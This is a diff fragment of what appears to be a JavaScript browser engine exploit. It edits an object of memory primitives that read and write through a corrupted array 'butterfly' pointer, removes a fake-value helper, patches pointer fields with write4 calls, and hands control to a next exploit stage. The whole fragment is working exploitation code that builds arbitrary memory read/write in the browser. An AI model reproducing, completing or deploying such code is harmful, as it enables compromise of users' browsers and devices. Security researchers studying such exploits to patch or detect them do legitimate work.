@@ -316,17 +316,10 @@ var prim = {
         this.write8(butterfly, new int64(0x41414141, 0xffff0000));
 
         return rtv;
-    },
-
-    createval: function (jsval) {
-        this.write8(butterfly, jsval);
-        var rt = leakval_helper[0];
-        this.write8(butterfly, new int64(0x41414141, 0xffff0000));
-        return rt;
     }
 };
 prim.write4(prim.leakval(master).add32(0x18), 0x18);
 prim.write4(slave_ptr_ptr.add32(0x18), 0x2);
 
 window.primitives = prim;
-if (window.postExpl) window.postExpl();
+nextStage();
